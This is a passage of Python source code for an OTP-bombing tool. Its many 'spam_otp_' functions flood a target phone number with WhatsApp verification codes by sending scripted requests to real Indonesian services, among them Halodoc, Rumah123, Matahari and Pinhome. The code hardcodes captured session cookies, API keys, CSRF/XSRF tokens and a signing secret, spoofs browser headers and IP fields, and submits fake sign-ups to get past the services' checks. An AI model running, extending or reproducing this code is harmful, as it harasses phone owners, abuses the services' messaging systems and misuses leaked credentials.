        else:
            if nomor.startswith('+62'):
                nomor = nomor[1:]
            else:
                if not nomor.startswith('62'):
                    nomor = '62' + nomor
        session = requests.Session()
        headers = {'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'}
        resp = session.post('https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7&versionCode=143&model=SM-S928B&systemVersion=14&platform=android&appsflyer_id=', json={'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}, headers=headers, timeout=10)
        return spam_otp_nilai(resp.text, '\"msg\":\"', '\"') == 'Success'
    except:
        return False
    
def spam_otp_pinhome(nomor):
    try:
        import re
        
        if nomor.startswith('0'):
            nomor_lokal = nomor
        elif nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        else:
            nomor_lokal = '0' + nomor
        
        session = requests.Session()
        
        r0 = session.get('https://www.pinhome.id/daftar',
            headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
            },
            timeout=10
        )
        
        if r0.status_code != 200:
            return False
        
        csrf_match = re.search(r'name="csrf-token" content="([^"]+)"', r0.text)
        if csrf_match:
            csrf_token = csrf_match.group(1)
        else:
            csrf_token = session.cookies.get('_X7kCsrf')
            if not csrf_token:
                return False
        
        url = 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp'
        
        headers = {
            'Content-Type': 'text/plain;charset=UTF-8',
            'x-csrf-token': csrf_token,
            'origin': 'https://www.pinhome.id',
            'referer': 'https://www.pinhome.id/daftar',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'accept': '*/*'
        }
        
        payload = {
            "accountType": "customers",
            "applicationType": "Pinhome Web",
            "countryCode": "62",
            "medium": "whatsapp",
            "otpType": "register",
            "phoneNumber": nomor_lokal
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False
    
def spam_otp_duniagames(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif nomor.startswith('+62'):
            nomor = nomor
        else:
            nomor = '+62' + nomor
        
        device = str(uuid.uuid4())
        
        url = 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id',
            'ciam-type': 'FR',
            'content-length': '58',
            'content-type': 'application/json',
            'origin': 'https://duniagames.co.id',
            'priority': 'u=1, i',
            'referer': 'https://duniagames.co.id/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'x-device': device
        }
        
        payload = {
            "phoneNumber": nomor,
            "userName": nomor[1:]
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get('code') == 200 or data.get('status') == 'success':
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False
           
    
def spam_otp_acc(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        next_action = "7f8e862fff4b3a97ae5e866780a086283a999e8a7f"
        next_router = "%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D"
        
        curl_cmd = f"""curl -s -X POST 'https://www.acc.co.id/register/new-account' \\
  -H 'Host: www.acc.co.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'next-action: {next_action}' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'next-router-state-tree: {next_router}' \\
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'Accept: text/x-component' \\
  -H 'Content-Type: text/plain;charset=UTF-8' \\
  -H 'Origin: https://www.acc.co.id' \\
  -H 'Sec-Fetch-Site: same-origin' \\
  -H 'Sec-Fetch-Mode: cors' \\
  -H 'Sec-Fetch-Dest: empty' \\
  -H 'Referer: https://www.acc.co.id/register/new-account' \\
  -H 'Accept-Encoding: gzip, deflate, br, zstd' \\
  -H 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'Cookie: _gcl_gs=2.1.k1$i1783212550$u132089247; _gcl_aw=GCL.1783212563.Cj0KCQjw3qLSBhDaARIsAFTiVh61CRKOfc78DkMYKO17cJqYH3QufK-mr9kpJU1bBxYt1tD6nnokC0oaAuAWEALw_wcB; _ga=GA1.1.2146116177.1783212563; _fbp=fb.2.1783212567536.574928455222574690; acw_tc=0a0a131517868956750878858e541f01b7d928d2a585326a758c753a2cc50e; deviceId=Mozilla%2F5.0%20(Linux%3B%20Android%2010%3B%20K)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F151.0.0.0%20Mobile%20Safari%2F537.36; _ga_HSTJBSDEEW=GS2.1.s1786895689$o3$g0$t1786895689$j60$l0$h0; _uetsid=d03ca050998a11f18069e52179483202; _uetvid=5d56eab0780b11f1b98421a5d543c1a8; mp_e88342495971d35d9d9164ffba696eec_mixpanel=%7B%22distinct_id%22%3A%22%24device%3Acf86d193-c59e-4187-be14-77874755733f%22%2C%22%24device_id%22%3A%22cf86d193-c59e-4187-be14-77874755733f%22%2C%22%24search_engine%22%3A%22google%22%2C%22utm_source%22%3A%22LAL%20Prospek%20IN%20Valid%20MGU%20Mar-Apr%22%2C%22utm_medium%22%3A%22Pmax%201%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.google.com%22%2C%22__mps%22%3A%7B%7D%2C%22__mpso%22%3A%7B%22initial_utm_source%22%3A%22LAL%20Prospek%20IN%20Valid%20MGU%20Mar-Apr%22%2C%22initial_utm_medium%22%3A%22Pmax%201%22%2C%22initial_utm_campaign%22%3Anull%2C%22initial_utm_content%22%3Anull%2C%22initial_utm_term%22%3Anull%2C%22initial_utm_id%22%3Anull%2C%22initial_utm_source_platform%22%3Anull%2C%22initial_utm_campaign_id%22%3Anull%2C%22initial_utm_creative_format%22%3Anull%2C%22initial_utm_marketing_tactic%22%3Anull%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.google.com%22%7D%2C%22__mpus%22%3A%7B%7D%2C%22__mpa%22%3A%7B%7D%2C%22__mpu%22%3A%7B%7D%2C%22__mpr%22%3A%5B%5D%2C%22__mpap%22%3A%5B%5D%7D; _gcl_au=1.1.612971413.1783212562.2099357529.1786895693.1786895726.1390151220.1786895693.1786895726' \\
  --data-raw '[{{"user_id":null,"action":"register","send_to":"{phone}","provider":"whatsapp"}}]'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data and len(data) > 0:
                    if data[0].get('success'):
                        return True
                    if data[0].get('message') and 'otp' in str(data[0].get('message')).lower():
                        return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False
        
def spam_otp_acc_kedua(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        else:
            nomor = '0' + nomor
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        if len(nomor) < 10:
            return False
        
        session = requests.Session()
        
        cookies = {
            '_gcl_gs': '2.1.k1$i1783212550$u132089247',
            '_gcl_aw': 'GCL.1783212563.Cj0KCQjw3qLSBhDaARIsAFTiVh61CRKOfc78DkMYKO17cJqYH3QufK-mr9kpJU1bBxYt1tD6nnokC0oaAuAWEALw_wcB',
            '_ga': 'GA1.1.2146116177.1783212563',
            '_fbp': 'fb.2.1783212567536.574928455222574690',
            'acw_tc': '0a0a01e217835298403947009e4f1c9a16075729b378a863551f2fa9c47ee0',
            'deviceId': 'Mozilla%2F5.0%20(Linux%3B%20Android%2010%3B%20K)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F149.0.0.0%20Mobile%20Safari%2F537.36',
            '_ga_HSTJBSDEEW': 'GS2.1.s1783529854$o2$g0$t1783529854$j60$l0$h0',
            '_uetsid': '1e3f09507aee11f1b6543d17dd2ca805',
            '_uetvid': '5d56eab0780b11f1b98421a5d543c1a8',
            '_gcl_au': '1.1.612971413.1783212562.2026417872.1783529859.1783529963'
        }
        
        session.cookies.update(cookies)
        
        headers_base = {
            'Accept': 'text/x-component',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://www.acc.co.id',
            'Referer': 'https://www.acc.co.id/register/new-account',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        }
        
        headers = headers_base.copy()
        headers['next-action'] = '7fd7799322a505bdfacd0dcd6cac5aa319e2350972'
        headers['next-router-state-tree'] = '%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D'
        
        payload = [
            {
                "user_id": None,
                "action": "register",
                "send_to": nomor,
                "provider": "whatsapp"
            }
        ]
        
        resp = session.post('https://www.acc.co.id/register/new-account',
            headers=headers,
            json=payload,
            timeout=10
        )
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                if data and len(data) > 0:
                    result = data[0]
                    if result.get('success'):
                        return True
                    else:
                        return False
                else:
                    return True
            except:
                if 'Server action not found' in resp.text:
                    return False
                return True if resp.status_code == 200 else False
        else:
            return False
        
    except Exception as e:
        return False
   
def spam_otp_absenku(nomor):
      try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()

        session.get(
            "https://registrasi.absenku.com/index.php/register/index/2",
            headers={
                "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            timeout=10
        )

        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "referer": "https://registrasi.absenku.com/index.php/register/index/2",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }

        session.post(
            "https://registrasi.absenku.com/index.php/register/validasi_trial",
            data={
                "nama": "Nama Lengkap",
                "email": "email@gmail.com",
                "telp": nomor,
                "company_name": "PT Test",
                "jumlah": "10",
                "tujuan": "1",
                "paket": "21",
                "ci_csrf_token": ""
            },
            headers=headers,
            timeout=10
        )

        resp = session.get(
            "https://registrasi.absenku.com/index.php/register/ajax_detik_otp",
            params={"telp": nomor},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400
      except:
        return False
    
def spam_otp_saturdays(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor
        
        session = requests.Session()
        url = "https://beta.api.saturdays.com/api/v1/user/otp/send"
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': '"Android"',
            'authorization': "undefined",
            'device-type': "mweb",
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'x-api-key': "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj",
            'sec-ch-ua-mobile': "?1",
            'country-code': "ID",
            'currency-code': "IDR",
            'platform': "mweb",
            'origin': "https://saturdays.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://saturdays.com/",
            'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i"
        }
        
        payload = {
            "number": nomor_lokal,
            "country_code": "+62",
            "type": "WHATSAPP"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
    
def spam_otp_maulagi(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '0' + nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        if len(nomor) < 10:
            return False
        
        url = 'https://api.maulagi.id/api/v2/auth/check'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'x-ml-key': 'C43BBQWN43',
            'origin': 'https://maulagi.id',
            'referer': 'https://maulagi.id/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        
        payload = {"credentials": nomor}
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        
        return resp.status_code == 200
        
    except Exception as e:
        return False

def spam_otp_bliblitiket(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif not nomor.startswith('+62'):
            nomor = '+62' + nomor
        session = requests.Session()
        headers = {'accept': '*/*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'x-channel-id': 'MWEB', 'x-client-id': '3ca1ed67701249861819ba4850f4f135', 'x-entity': 'BLIBLI', 'x-lang': 'id', 'x-request-id': spam_otp_codex(36), 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
        session.get('https://account.bliblitiket.com/register', headers={'user-agent': headers['user-agent']}, timeout=10)
        nomor_encoded = nomor.replace('+', '%2B')
        session.get(f'https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/registration/status?identity={nomor_encoded}&doMigration=false', headers=headers, timeout=10)
        headers['content-type'] = 'text/plain;charset=UTF-8'
        headers['origin'] = 'https://account.bliblitiket.com'
        headers['referer'] = 'https://account.bliblitiket.com/register'
        headers['x-request-id'] = spam_otp_codex(36)
        resp = session.post('https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate', data='{"action":"REGISTER_OTP","channel":"WHATS_APP","recipient":"' + nomor + '","recaptchaToken":""}', headers=headers, timeout=10)
    except:
        return False
     
def spam_otp_matahari(nomor):
      try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor              
        
        import random
        import string
        random_email = f"user{random.randint(100000,999999)}@gmail.com"
        random_name = f"User{random.randint(100,999)}"
        random_password = ''.join(random.choices(string.ascii_letters + string.digits + "._", k=16))
        
        session = requests.Session()
        url = "https://matahari-backend-prod.matahari.com/api/auth/register"
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': "?1",
            'Origin': "https://matahari.com",
            'Sec-Fetch-Site': "same-site",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://matahari.com/",
            'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        
        payload = {
            "emailAddress": random_email,
            "name": random_name,
            "mobileCountryCode": "",
            "mobileNumber": nomor_lokal,
            "birthDate": "2000-01-01",
            "genderId": "1",
            "password": random_password,
            "cardNumber": "",
            "referralCode": "",
            "salesmanId": "",
            "pickupStoreCode": "",
            "marketingCode": ""
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
      except:
        return False

def spam_otp_rumah123(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://www.rumah123.com/api/otp/request-otp"
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br",
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'content-type': "application/json;charset=UTF-8",
            'sec-ch-ua-mobile': "?1",
            'base-url-core': "https://www.rumah123.com",
            'origin': "https://www.rumah123.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.rumah123.com/user/login?redirect=https://www.rumah123.com/",
            'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i",
            'Cookie': "ajs_anonymous_id=962b0766-64e4-493c-ae48-e59524822742; _ga=GA1.1.533350590.1780038198; _fbp=fb.1.1780038199360.807614422108834462; _tt_enable_cookie=1; _ttp=01KSS8PT9AQ=2N85JA4NBZ289F_.tt.1; __gads=ID=6ca90e1a33b998e9:T=1780045927:RT=1780045927:S=ALNI_Mb48=zdld8fUzNTj2mKtzcuQteMfQ; __gpi=UID=000014381fc3b087:T=1780045927:RT=1780045927:S=ALNI_MbWUjDmbUHcU-lmpT4CdYzH88d6yw; __eoi=ID=c85668bfa6f5416c:T=1780045927:RT=1780045927:S=AA-AfjZDUEoWxpdAvxXN4ehDANSQ; enquiry_data={\"email\":\"Jokowi@gmail.com\",\"isEverTickMortgage\":false,\"isVerified\":false,\"name\":\"Bray\",\"otpExpiredTime\":1780046220580,\"phoneNumber\":\"6285757102633\",\"requestOTPTime\":1780048557646}; 99group=s%3Accfa8db0-50f5-4e86-8aeb-35622f2b2cc0.G%2FYccepBgrnc6CJZvAPejEIwPe0jzpnoIjF3bvdL35s; _cfuvid=JIxmpGlboMHKgIlCU_H9Oc5=kw9ZYv9H8Mgr0B2FOec-1780182128.8329046-1.0.1.1-hIBwtBRvNB1Bv5_PsQGgwwAgoLU8KCBhSa6g9Abs9.Q; _clck=1n8grzt%5E2%5Eg6h%5E0%5E2340; flag_data={\"showAppsDownloadBanner\":true}; FCCDCF=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5B32%2C%22%5B%5C%22e1507b7e-d15b-40ef-b408-d0cc88941c59%5C%22%2C%5B1780038190%2C882000000%5D%5D%22%5D%5D%5D; segment-utm=eyJpdG1fbWkaX=tIjoiIiwiaXRtX3NvdXJjZSI6IiIsInBhZ2=fcm=mZXJyZXIiOiJodHRwczovL3d3dy5nb29nbGUuY29tLyIsInNlc3Npb25fY291bnQiOjMsInNlc3Npb25fcm=mZXJyZXIiOjE3ODAxODIxMzE0MTIsInRpbW=zdGFtcCI6MTc4MDE4MjE3MDg0OSwidXRtX2NhbXBhaWduIjoiIiwidXRtX21lZGl1bSI6IiIsIn=0b=9zb3=yY2UiOiIifQzz; FCNEC=%5B%5B%22AKsRol-ufo=7rjU2mcoI=kLK9e4X2SajLpPwjup6Os7MDD0gzmh_Cgps6b5CUxPAUD9eSXrKUE0ClyvIK2CkIZkYxujk5vOnGmDR050J8xB26-Hqp6hvMh1wYxihBBen1G3_ysUKac0FyaTTkRoQ-ZefR2bi6ko8TA%3D%3D%22%5D%5D; _ga_D5=06TRY2RzGS2.1.s1780182173$o4$g0$t1780182173$j60$l0$h0; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22WHnraPibWLKLluimE5Gw%22%2C%22expiryDate%22%3A%222027-05-30T23%3A02%3A54.553Z%22%7D; ttcsid=1780182175610::ron=FY0wjKCEa72LL2gJ.4.1780182182816.0::1.-37243.0::7090.2.285.885::0.0.0; ttcsid_C2OBT2A3E7AM6FQ8BMMG=1780182175601::NBtm-TUK-lurT5Q-Kl19.4.1780182182817.0; _ga_Z36X54E7Z5=GS2.1.s1780182173$o4$g0$t1780182182$j51$l0$h0; _gcl_au=1.1.950890321.1780038193.1925756783.1780182179.1780182183"
        }
        
        payload = {
            "ipAddress": f"140.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "phoneNumber": nomor_lokal,
            "portalId": 1,
            "type": "WHATSAPP",
            "url": "https://www.rumah123.com/user/login?redirect=https://www.rumah123.com/"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
       
def spam_otp_halodoc(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://customers.api.halodoc.com/magneto-api/v2/users/authentication/otp/requests"
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': '"Android"',
            'X-XSRF-TOKEN': "E581E099A363DC049909F3AACDCEA6248D995C45F4A53111BDA0A626487D025AD83FD42B99E0FFA4CF48A9663628E322BEE9",
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': "?1",
            'Origin': "https://www.halodoc.com",
            'Sec-Fetch-Site': "same-site",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://www.halodoc.com/",
            'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            'Cookie': "rx=isitorrwlrur9lz1780208322401=UP888O9A=FOLNR8R0HR3389UTPU62HD; dtSarwlrur9lz-; _gcl_au=1.1.1758244023.1780208325; _ga=GA1.1.51880007.1780208328; rxvtrwlrur9lz1780210130688|1780208322422; dtPCrwlrur9lz5$8322365_313h32vHSWFLANATLPCNEMPCUQHAFKRGRTPDUTW-0e0; dtCookierwlrur9lzv_4_srv_5_sn_85FE102AE029FEC31922E56941139E18_app-3Ae28137e9070184e7_0_app-3Aea7c4b59f27d43eb_0_ol_0_perc_100000_mul_1_rcs-3Acss_0; afUserId=69040147-6a0d-47d5-8454-8d920230c2f0-p; AF_SYNC=1780208331597; WZRK_Gz=f8f4004de684498e9aea0d16dcfc99d4; WZRK_S_WR9-ZRZ-9W7Z=%7B%22p%22%3A1%2C%22s%22%3A1780208334%2C%22t%22%3A1780208334%7D; _ga_02NBJNEK=HGS2.1.s1780208328$o1$g0$t1780208338$j50$l0$h0; XSRF-TOKEN=E581E099A363DC049909F3AACDCEA6248D995C45F4A53111BDA0A626487D025AD83FD42B99E0FFA4CF48A9663628E322BEE9"
        }
        
        payload = {
            "phone_number": f"+{nomor_lokal}",
            "channel": "whatsapp",
            "otp_resent": False,
            "clientId": "4dccb45a031542ad01fd22931238c909"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False
        
def spam_otp_misteraladin(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        else:
            nomor = nomor

        import time
        import hashlib
        
        timestamp = str(int(time.time()))
        
        secret = '6c7A1ZUdVtREXQxO5XcW83ESODEoUld7fJGZCvor8awEcm24tr'
        raw = f'{secret}{timestamp}'
        member_token = hashlib.sha256(raw.encode()).hexdigest()

        url = 'https://m.misteraladin.com/api/members/v2/otp/request'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id',
            'content-type': 'application/json',
            'origin': 'https://m.misteraladin.com',
            'referer': 'https://m.misteraladin.com/account',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'x-member-token': member_token,
            'x-platform': 'mobile-web',
            'x-request-time': timestamp
        }

        payload = {
            "phone_number_country_code": "62",
            "phone_number": nomor,
            "type": "register"
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)

        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get('data') and data['data'].get('phone_number'):
                    return True
                elif data.get('status') == 'success' or data.get('success') == True:
                    return True
                else:
                    return False
            except:
                return True
        else:
            return False

    except Exception as e:
        return False
       
def spam_otp_paper(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor
        
        session = requests.Session()
        url = "https://register.paper.id/api/v1/auth/register/send-otp"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://paper.id',
            'x-paper-user-agent': 'multiverse/2.54.1 mobile_web (android) chrome',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Referer': 'https://paper.id/'
        }
        
        payload = {
            "phone": nomor_lokal,
            "method": "whatsapp",
            "registered_by": "flutter mweb"
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        

        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success" or "otp" in str(data).lower():
                return True
            else:
                return False
        else:
            return False
            
     except Exception as e:
        return False
        
def spam_otp_singa_toy(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor = nomor
        else:
            nomor = '0' + nomor
        
